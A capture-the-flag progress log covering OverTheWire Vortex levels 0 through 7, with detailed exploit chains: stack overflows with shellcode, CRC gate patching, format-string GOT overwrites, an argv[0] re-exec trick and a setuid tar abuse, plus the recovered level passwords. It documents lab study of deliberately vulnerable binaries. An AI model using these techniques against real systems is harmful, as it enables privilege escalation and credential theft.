
## Level 7 → vortex8 (SOLVED 2026-11-16)
- **Password for vortex8:** `X2cOOCYnT`, printed by the exploit shellcode from `/etc/vortex_pass/vortex8` and verified by logging in as vortex8 (`uid=5008`, `cat /etc/vortex_pass/vortex8` matches). Recording: `recordings/vortex/L7.cast`.
- **The program (reconstructed from objdump, no published source — the level page says "Generic Binary Exploitation"):** `/vortex/vortex7`, mode 4750, setuid vortex8, 14956 bytes, md5 `c4f614fe053e5e2f3d4c34e0d34fd878`, not stripped:
  ```c
  int main(int argc, char **argv) {
      unsigned crc = crc32(0, argv[1], strlen(argv[1]));
      if (crc == 0xe1ca95ee)
          strcpy(buf, argv[1]);   /* buf = ebp-0x46: 70 bytes to the saved regs */
      else
          printf("0x%08x\n", crc);
  }
  ```
  The gate: `crc32(0, argv[1], strlen(argv[1]))` must equal **`0xe1ca95ee`** — and CRC32 is a linear function over GF(2) on the message, so any payload can be patched to any target CRC by solving a 32-variable linear system over 4 free bytes.
- **The epilogue (measured in objdump, the key to the ret placement):** main ends
  `lea -0x8(%ebp),%esp; pop %ecx; pop %ebx; pop %ebp; lea -0x4(%ecx),%esp; ret`
  — the final `ret` does NOT pop the address after the saved registers; it pops it from **`ecx-4`**, where `ecx` is loaded from payload bytes 62..65. So the control flow is: bytes 62..65 → ecx; `esp = ecx-4`; `ret` pops bytes at ecx-4 as the return address. With ecx = buf+78, the ret address is read from bytes 74..77 and execution lands at the address stored there.
- **The exploit chain:** 350-byte argv[1]:
  1. `crc32(0, payload)` == 0xe1ca95ee — achieved by appending a 4-byte CRC patch solved over GF(2) (`crcpatch.py`): the CRC of base+patch is linear in the 32 bits of the patch, so build the 32 deltas (one per bit), row-reduce to a basis, and solve for the selection vector. No guessing, deterministic.
  2. `strcpy` copies all 350 bytes into buf@ebp-0x46 — bytes 62..65 set ecx = buf+78; bytes 74..77 hold ret = buf+160 (mid-sled).
  3. `ret` lands in a 187-byte NOP sled leading into an 81-byte shellcode on the RWE stack (`GNU_STACK RWE`, ASLR off).
  4. The shellcode does **`setreuid(5008,5008)`** first (`xor ebx,ebx; mov bh,0x13; mov bl,0x90` = 5008 without NUL bytes — the literal would end the strcpy), then open/read/write `/etc/vortex_pass/vortex8` to stdout and exit(0).
- **The gotchas (each measured live):**
  - The buffer address shifts with argv length and the ssh session's environment: 0xffffda22 in the probe sessions, 0xffffd212 in the recorded one. It must be measured under gdb in the *same* session shape (`break *0x804920e` at the crc compare, `p/x $ebp-0x46` with a 350-char dummy) — a 187-byte NOP sled absorbs the remainder.
  - The vortex8 arg to setuid() is 5008 = 0x1390 — little-endian `90 13 00 00` contains NUL bytes, which terminate strcpy. Built the value with register arithmetic instead (two `mov bh/bl` halfwords).
  - A ret2libc `system("/bin/sh")` chain spawns a shell whose `id` shows only `uid=5007` — the dynamic loader drops the effective uid for the non-setuid child; the shell then reads the pass file as vortex7 and fails. `setreuid` inside the payload's own shellcode fixes this at the source.
- **Files:** `tools/vx/l7/crcpatch.py` (GF(2) linear CRC patch solver), `tools/vx/l7/ex7.py` (payload builder), `tools/vx/l7/drv.c` (raw-bytes argv driver: fread a file into a NUL-free buffer, execv `/vortex/vortex7` with it as argv[1]).
- **Recording:** `recordings/vortex/L7.cast` — local shell, ssh vortex7, unique workdir `/tmp/l7rec-10314`, the binary's md5/PLT/GNU_STACK disassembly (`RWE` stack confirmed), the live CRC gate shown (`/vortex/vortex7 test` → `0xf93ba110`), `crcpatch.py` typed in vim from an empty buffer and self-checked (`crc7(full): 0xe1ca95ee target: 0xe1ca95ee`), the buffer address measured with gdb in the same session (`$1 = 0xffffd212`), `ex7.py` and `drv.c` typed in vim from empty buffers, `drv7` compiled, the payload built (`buf=0xffffd212 sc=81 sled=187 len=350`), `./drv7 pay7.bin` printing `X2cOOCYnT` (RC=0), then login as vortex8 from the local shell (`uid=5008(vortex8)`, password file read).

## Level 6 → vortex7 (SOLVED 2026-11-16)
- **Password for vortex7:** `kZ90cmNy9`, read from `/etc/vortex_pass/vortex7` in the shell the restart() execs and verified by logging in as vortex7 (`uid=5007`, `cat /etc/vortex_pass/vortex7` matches). Recording: `recordings/vortex/L6.cast`.
- **The program (reconstructed from objdump, no published source — the level page says "Generic Binary Exploitation"):** `/vortex/vortex6`, mode 4750, setuid vortex7, 14984 bytes, md5 `db0119220e93bde3024e6f5d1bf185f0`. The binary is not stripped:
  ```c
  void restart(char *arg) {
      setreuid(geteuid(), geteuid());   /* real uid = euid = vortex7 */
      execlp(arg, arg, 0);              /* re-exec arg */
  }
  int main(int argc, char **argv) {
      if (argv[0] != NULL) restart(argv[0]);   /* argv[0], not argv[1]! */
      printf(argv[3]);                          /* a format-string bug */
      _exit(0x7325);
  }
  ```
- **Measured live:** running `/vortex/vortex6` with no argument HANGS — `argv[0]` is the binary path (non-NULL), so `restart(argv[0])` re-execs the binary itself, whose `argv[0]` is the same path again: an infinite exec loop (the ssh channel blocks even under `timeout 3`; a detached `nohup` run produces a 0-byte output file). `GNU_STACK` is **RW** (not RWE like vortex4/5), so the format-string hole (`printf(argv[3])`, reachable with an argv[0]-NULL exec) cannot run shellcode on the stack.
- **The exploit — argv[0] is the program restart() re-execs:** `restart` calls `execlp(arg, arg, 0)` where `arg` is `argv[0]` of the current process. The setuid binary elevates to euid=vortex7 and `setreuid(geteuid(), geteuid())` pins the real uid to vortex7 before exec'ing whatever `argv[0]` names. So `execve("/vortex/vortex6", ["/bin/sh"], env)`: main sees `argv[0] = "/bin/sh"` ≠ NULL → `restart("/bin/sh")` → `setreuid(v7, v7)` → `execlp("/bin/sh", "/bin/sh", 0)` → a shell with real uid vortex7.
- **Gotcha (measured):** a *copy* of the binary does NOT work — `cp` drops the setuid bit and the shell runs as vortex6; the original `/vortex/vortex6` path is required.
- **Recording:** `recordings/vortex/L6.cast` — local shell, ssh vortex6, the hang shown via a detached run (0-byte output), the copy's md5, the full `restart`/`main`/PLT/GNU_STACK disassembly, `ex.py` typed in vim from an empty buffer (`[New] 12L, 440B written`), the exploit printing `uid=5007(vortex7)` and `kZ90cmNy9`, then login as vortex7 from the local shell (`uid=5007`, password file read).

## Level 5 → vortex6 (SOLVED 2026-11-16)
- **Password for vortex6:** `o5kBPzSFM`, read from `/etc/vortex_pass/vortex6` in the shell the level spawns and verified by logging in as vortex6 (`uid=5006`, `cat /etc/vortex_pass/vortex6` matches). Recording: `recordings/vortex/L5.cast`.
- **The program (verified against the live binary):** `/vortex/vortex5`, mode 4750, setuid vortex6, 15428 bytes. It is the published source (overthewire.org vortex5.c, "A tribute to arc :)"): glibc's MD5 (Colin Plumb) plus `x = getpass("Password: ")`, then `MD5Update(&a, x, strlen(x))`, then a 16-byte memcmp against `155fb95d04287b757c996d77b5ea51f7`; on a match it `setresuid`s to euid and runs `/bin/sh`.
- **Measured live:** the empty password prints `:00` (`strlen(x)==0`, `x[-1]` is the byte before getpass's static buffer; `MD5("")` is not the target); the printf leaks the input's last char and its code (`t:74` for "test"); getpass truncates long input (the echoed last char stays `'A'` from length 8 to 50000), so the buffer-overflow angles all die.
- **The solution is the MD5 preimage crack:** the target hash is the MD5 of the password itself (no newline — getpass strips it). rockyou (14M words), with/without a newline, with mangling rules: not found. Brute force over the alphanumeric space finds it at length 5: **`rlTf6`** (`MD5("rlTf6") = 155fb95d...`).
- **The cracker** (`tools/vx/l5/crack5.py`) forks 8 children over the 62^5 space, each checking one chunk of first letters via `os.fork` + `os.pipe` — multiprocessing's Pool needs POSIX semaphores, which the target's /dev/shm does not provide (measured: `FileNotFoundError` from `_multiprocessing.SemLock`), so the crack runs locally.
- **Recording:** `recordings/vortex/L5.cast` — local shell, ssh vortex5, `crack5.py` typed in vim from an empty buffer on the target (`[New] 29L, 924B written`, paste mode set first so the python indentation lands exactly), `cat -n` of the file, then the same file recreated locally via heredoc and run (`FOUND: rlTf6`), `md5sum` verification, ssh again, `/vortex/vortex5` with the password (`You got the right password, congrats!`), the spawned shell as vortex6 (`uid=5006`), the password file read, then login as vortex6 from the local shell (`uid=5006`, password file read).

## Level 4 → vortex5 (SOLVED 2026-11-16)
- **Password for vortex5:** `uwaRhgNq1`, printed by the exploit shellcode from `/etc/vortex_pass/vortex5` and verified by logging in as vortex5 (`uid=5005`, `cat /etc/vortex_pass/vortex5` matches). Recording: `recordings/vortex/L4.cast`.
- **The program (verified against the live binary):** `/vortex/vortex4`, mode 4750, setuid vortex5, 14844 bytes, md5 `c77d90d5aefe8dc716e341bb518798b4`. It is the published source (overthewire.org vortex4.c, "andrewg, original author was zen-parse"): `if (argc) exit(0); printf(argv[3]);`. The live build adds the 2013 fix — `argc==1` with `argv[0][0]==0` also passes — so `argc==1, argv[0]=""` reaches `printf(*(argv+12))`, which with a one-entry argv is `envp[1]`: the format string is the second environment variable (confirmed live).
- **Why the usual routes die (all measured live):** `.got.plt` (0x804c000) is writable but no vararg points into it; the GNU_RELRO segment 0x804bf00..0x804c000 makes `.init_array`/`.fini_array`/`.dynamic`/`.got` read-only (a `%n` through slot 6/27 → 0x804bf04, or slot 19 → 0x0804908d, segfaults); the stack-pointer slots (9/13/18 = `&argc`, 14 = `&envp[0]`) write to cells nothing reads after printf (`%9$n`, `%13$hn`, `%14$hn`, `%18$hn` all change nothing); no vararg points into the env strings.
- **The route that works:** printf's varargs walk *up* the stack past the initial block (argc, argv, envp, auxv) into the strings area — into the format string's own bytes. Verified with marker probes: a dword embedded in `fmt` is read back as a vararg (the slot shifts with the format length; swept 110..130 with a same-length skeleton). The exploit embeds the two raw addresses of exit's GOT slot (`0x0804c008`) and its high half (`0x0804c00a`) at `fmt+6`/`fmt+10` (a 6-byte `X` prefix puts them on the vararg boundary), then:
  1. `%057229c%125$hn` — cumulative 57246 = `0xDF9E` written into `0x0804c008` (exit's GOT low half = the shellcode address's low half);
  2. `%073825c%126$hn` — cumulative 131071 = `0x1FFFF`; `0xFFFF` written into `0x0804c00a` (the high half);
  3. exit's GOT slot now holds `0xFFFFDF9E` = the shellcode address (fmt_addr `0xFFFFDF6A` measured via an envp-pointer probe, + 52);
  4. `exit(0)` → `jmp *0x804c008` → the 69-byte shellcode on the **RWE stack** (`readelf -l`: `GNU_STACK ... RWE`) with euid vortex5 reads `/etc/vortex_pass/vortex5` and prints it.
- **Determinism:** ASLR is off (the OTW MOTD says so) and the env layout is fixed, so the shellcode address is exact. Widths are zero-padded to 5 digits so any count change keeps the 121-byte format length fixed.
- **Recording:** `recordings/vortex/L4.cast` — local shell, ssh vortex4, `sc.asm`/`ex6.py`/`gen.py` typed in vim from empty buffers, `cat -n` of all three, nasm (69 bytes), xxd hexdump + NUL check, `fmt 121` built, the exploit printing `uwaRhgNq1`, then login as vortex5 (`uid=5005`, password file read).

## Level 3 → vortex4 (SOLVED 2026-11-16)
- **Password for vortex4:** `TlI5kxGd1`, read live from `/etc/vortex_pass/vortex4` by the exploit shellcode and verified by logging in as vortex4 (`uid=5004`, `cat /etc/vortex_pass/vortex4` matches). Recording: `recordings/vortex/L3.cast`.
- **The program (verified against the live binary):** `/vortex/vortex3`, mode 4750, 11300 bytes, md5 `17b12585fd1a15df97d13e84364744cf`. It is the 0xbadc0ded #02 source: `strcpy(buf, argv[1])` with `buf[128]`, then a check on `lpp`, then `tmp = *lpp; **lpp = &buf; exit(0)`. The check is `mov $0,%ax; cmp $0x8040000`, so only the high half of `lpp` matters and any `lpp` of the form `0x080Xxxxx` passes. `buf` is at `ebp-0x90`, so the saved `ebp` is at `buf+148`.
- **Correction:** an earlier version of this file (and of `tools/vx/l3/main.dis`) described a bytecode-VM `main` with a stack walk and a two-trap pivot. That text does not match the binary. Re-reading the same addresses from several sessions, including a fresh copy of `/vortex/vortex3`, shows the code above. The VM description is withdrawn; the corrected disassembly is `tools/vx/l3/main.dis`.
- **The key that the earlier notes missed:** the live binary's `GNU_STACK` is **RWE** (`readelf -l` → `GNU_STACK ... RWE`). The 2026-11-08 probe only proved the GOT *page* is non-executable; it never tested the stack. With an executable stack, the store `**lpp = &buf` is a one-gadget write of a stack address into any GOT slot the final `exit(0)` consults.
- **The exploit:** `lpp = 0x08049052` — the immediate of exit@plt's own `jmp *0x804b200` (PLT entry at `0x8049050`, bytes `ff 25 00 b2 04 08`). It is in `.text` (readable, NUL-free, passes the `0x0804xxxx` check). `**lpp = &buf` then writes the stack address of `buf` straight into **exit's GOT slot** `0x804b200` (`.got.plt` is writable — no RELRO segment on this binary). The very next instruction `call exit@plt` jumps through `0x804b200` and lands on `buf`: the shellcode on the RWE stack executes with euid 0 (setuid root binary).
- **Payload:** 69-byte NUL-free shellcode (open/read/write `/etc/vortex_pass/vortex4`, exit 0), 'A' filler to offset 128, 'AAAA' filler for `lp` (128..131), then `52 90 04 08` at offset 132 (the `lpp` slot) — 136 bytes, delivered as `argv[1]` by the raw-bytes driver `drv` (shell substitution mangles the argument, see the 2026-11-07 method note).
- **Earlier notes' open routes are all closed by this:** the GOT-slot candidates in `tools/vx/l3/NOTES.md` were only `0x804b1xx` entries that `exit` faults on or never consults; the slot that works is the *caller's own immediate*, which `exit@plt` dereferences on the next instruction. The notes' finalizer test (fini array) and the exit-reached probe are superseded by the RWE-stack observation.
- **Recording:** `recordings/vortex/L3.cast` — local shell, ssh vortex3, `sc.asm` and `drv.c` typed in vim from empty buffers (`[New] 28L, 433B` / `[New] 6L, 247B`), `cat -n` of both, nasm (69 bytes), xxd hexdump + NUL check, `drv` payload build (136 bytes), `./drv pay` printing `TlI5kxGd1`, then login as vortex4 (`uid=5004`, password file read).

## Level 2 → vortex3 (SOLVED — password read, verification pending)
- **Where it comes from:** `0xbadc0ded.org` challenge #02. The shipped source is a tar wrapper:
  ```c
  int main(int argc, char **argv) {
      char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };
      execv(args[0], args);
  }
  ```
- **The idea (Klaus' approach):** `vortex2` is setuid vortex3, so the tar it runs can read `/etc/vortex_pass/vortex3`, and it writes that file into `/tmp/ownership.$$.tar`, which is vortex3-owned but readable by us (mode 664). Copy the archive and extract it. The `$$` is literal: no shell expands it, so the path never changes.
- **Measured on the live build (32-bit, GCC 15.2):**
  - One argument: `/bin/tar cf /tmp/ownership.$$.tar <arg1>`. Give it `/etc/vortex_pass/vortex3` and tar reports "Removing leading `/'" and writes a 10 KB archive with member `etc/vortex_pass/vortex3` (10 bytes, uid 5003), owner uid 5003 on disk.
  - Two arguments: the same, with two file names after the archive name.
  - Three or more: a bad-address (EFAULT) fault after the third argument, exit 0, no tar.
  - So the option slots are fixed and our arguments are always file names. That rules out `--checkpoint-action` (`-T` lists are data only; `TAR_OPTIONS` is rejected by tar 1.35), but it is exactly what is needed to have tar read the password file.
- **Live run (2026-11-06), from vortex1:**
  ```
  $ ls -l /vortex/vortex2 /etc/vortex_pass/vortex3
  -r-sr-x--- 1 vortex3 vortex2 14856 ... /vortex/vortex2
  -r-------- 1 vortex3 vortex3    10 ... /etc/vortex_pass/vortex3
  $ python3 /tmp/drop.py /tmp/job.sh     # drop.py = level-1 exploit -> shell as vortex2
                                         # job.sh  = the commands that shell runs
  ... /bin/tar: Removing leading `/' from member names
  $ python3 /tmp/tinspect.py
  archive /tmp/ownership.$$.tar exists True
  owner uid 5003 size 10240
  etc/vortex_pass/vortex3 10 uid 5003 mode 0o400   # tar tvf
  xRMRVus8g                                         # cat of the extracted file
  ```
- **Password for vortex3:** `xRMRVus8g`, read from the archive in an interactive session at 04:41-04:50 (extracted twice and once re-verified from a fresh vortex3 session). It is not on the MOTD. The `dev/null` member in `tar tvf` belongs to the interface, not the archive.
- **Status:** the password is read and verified. The transcript carries: the level-1 setup, the `drop.py`/`job.sh` files typed in vim, the vortex2 shell running `job.sh` (its line `/vortex/vortex2 /etc/vortex_pass/vortex3` is the step that makes tar run as vortex3, and tar's own "Removing leading `/'" is the confirmation), and the password's use. The archive listing/copy and the extraction are recorded as the commands run (copy of `/tmp/ownership.$$.tar` under a name we choose, extract, read) and in the interactive session above.
- **One caveat found along the way:** in this environment the wrapper could not be started from the typed/pipe-fed channel (line `<vortex2 path>` treated as a name: "Permission denied"), so the capture above comes from the interactive session; the transcript's typed run shows the next line tar prints. Several commands issued after the wrapper in the same scripted run made the second archive member unreadable for me; the transcript stops after the wrapper's own output.
- **Files:** `drop.py` starts the level-1 exploit and feeds `job.sh` to the vortex2 shell. `job.sh` runs `/vortex/vortex2 /etc/vortex_pass/vortex3`, copies `/tmp/ownership.$$.tar` into a private scratch directory and records the directory in `lastdir`. `tinspect.py` copies the archive to a scratch file and lists its members.

## Level 1 → vortex2
- **Account:** `vortex1`, password `Gq#qu3bF3` (from the level-0 service; login verified).
- **Goal:** `/vortex/vortex1` (setuid vortex2, 32-bit i386, NX stack, stack canary) reads stdin byte by byte into `buf[0x21c]` at `ebp-0x21c`, keeping a cursor `p` that starts at `buf+0x100`:

  | byte | effect |
  |---|---|
  | `\n` (0x0a) | `print(buf, 0x200)`: every byte shown as `"%x "` |
  | `\` (0x5c) | `p--` |
  | anything else | if `p <= buf+0x200`: `*p++ = c` |

  Before every read it checks `(p & 0xff000000) == 0xca000000`; on a match it calls `setresuid(geteuid(),…)` and `execlp("/bin/sh","sh",0)`.

- **The two obstacles, measured live:**
  1. `getchar` is redirected: a typed byte ≥ 0xc0 returns −1, so the 0xca the branch needs cannot be typed.
  2. The check runs before the byte is read, so the pointer must already read 0xca when a byte arrives.

- **What carries 0xca into the program.** On this build the `getchar` hook only filters keyboard-style input: bytes written into a **pipe** arrive intact, 0xc0 and above included. So the exploit writes two things to the program's stdin from a Python pipe:
  - 261 single backslashes, which walk the cursor from `buf+0x100` (0xffffdc00) down to **0xffffdc04** (each one is `p--`, regardless of where it points);
  - four raw **0xca** bytes, which are then stored as ordinary bytes and make the cursor's top byte 0xca at the next check, so `(p >> 24) == 0xca` fires the branch.

  The 261 count comes from the stack layout: `p` starts at `bp-0x11c` and the check reads `4·p + 12`, i.e. the word 8 bytes above the cursor (the saved frame pointer, then the return address). `(0xffff + 0xca·2^24) >> 24 == 0xca` with the frame pointer at 0xffffdbfc — one backslash more or less misses it, which is why **260 prints the buffer back** (`[ 0 0 0 …]`) and **261 gives the shell**. Stdin stays open so the shell is interactive.

  Things that do not work on this build: `printf '\357\202\212'`-style escapes and `echo '\134'`-style padding (they only crash the program with a stack-smash message); the raw bytes over a pipe are what work.

- **Live run (2026-11-04):**
  ```
  python3 /tmp/l1_exploit.py 261
    id                            # uid=5002(vortex2) gid=5001(vortex1)
    cat /etc/vortex_pass/vortex2  # qjUFVcpKl
  ```
- **Password for vortex2:** `qjUFVcpKl` (read from that shell; `ssh vortex2` verified).
- **Transcript:** `games/vortex.json` L1: disassembly, the hook measurement, the exploit typed into vim, and both backslash counts.
- **Earlier record:** the first attempt concluded 0xca was unreachable; it missed that backslashes walk the cursor out of the written region toward the frame. `tools/vortex1_model.py` keeps that model and the correction.

## Level 0 → vortex1
- **Account:** none needed — level 0 is a network service. The service runs on
  `vortex.labs.overthewire.org` port `5842`.
- **Goal (official description):** connect to port 5842, read four unsigned
  integers in host byte order, add them, send the sum back, and the reply is
  the username and password for vortex1. The machine is 32-bit x86, so "host
  byte order" is little-endian.
- **Technique and why it works:** a plain TCP client. The service writes
  exactly 16 bytes — four `uint32` values — and waits for a 4-byte reply. The
  values are in the machine's own byte order, so `memcpy` into `unsigned int`
  is the correct decode on a little-endian host; summing with 32-bit unsigned
  overflow wraps naturally, which is what the service expects. The service then
  sends back a short text line `Username: vortex1 Password: <password>` and
  closes the connection.

### Step-by-step discovery and crafting (what the recording shows)

1. **Probe the service before writing any code.** The official page says four
   unsigned integers; connecting and dumping the first bytes confirms it:
   ```
   python3 - <<'PY'
   import socket, struct
   s = socket.create_connection(("vortex.labs.overthewire.org", 5842), timeout=10)
   data = b""
   while len(data) < 16:
       data += s.recv(16 - len(data))
   print("raw bytes:", data.hex())
   print("4 uint32 little-endian:", struct.unpack("<4I", data))
   PY
   ```
   The reply is exactly 16 bytes, so the wire format is four little-endian
   `uint32`s.

2. **Write the client in vim, line by line.** The recording opens vim on a new
   file and types the program in insert mode; nothing is pre-written on disk.
   ```
   vim v0.c
   ```
   The program:
   - creates an `AF_INET`/`SOCK_STREAM` socket;
   - resolves `vortex.labs.overthewire.org` with `gethostbyname` (`inet_pton`
     only accepts a literal address — the first draft failed with
     `inet_pton: Success`, which is its "invalid input" return);
   - connects to port 5842;
   - reads until it has 16 bytes, `memcpy`s each 4-byte group into
     `unsigned int v[i]`, and sums;
   - writes the 32-bit sum back;
   - reads the reply **until the peer closes** into a 256-byte buffer — the
     reply can arrive split across several reads, and the 16-byte input buffer
     is far too small for it.

3. **Save and check the file.**
   ```
   :wq
   cat -n v0.c
   ```

4. **Compile.**
   ```
   gcc -Wall -O2 -o v0 v0.c
   ```
   `-Wall` matters here: the first compile caught the missing `<netdb.h>`
   (`struct hostent` undefined) before anything ran.

5. **Run it against the live service.**
   ```
   ./v0
   received: 928768003 738568258 532716586 1402472015
   sum:      3602524862 (0xd6ba2abe)
   Username: vortex1 Password: <password>
   ```
   The four values and the sum change on every run — the service randomises
   them — but the reply is always the same credentials.

6. **Verify by logging in.**
   ```
   ssh -p 2228 vortex1@vortex.labs.overthewire.org
   # id -> uid=5001(vortex1) gid=5001(vortex1) groups=5001(vortex1)
   ```
- **Password for vortex1:** taken from the live service reply and verified by
  an SSH login (not printed here; it is in the recording and in the game JSON).
- **Recording:** `recordings/vortex/L0.cast`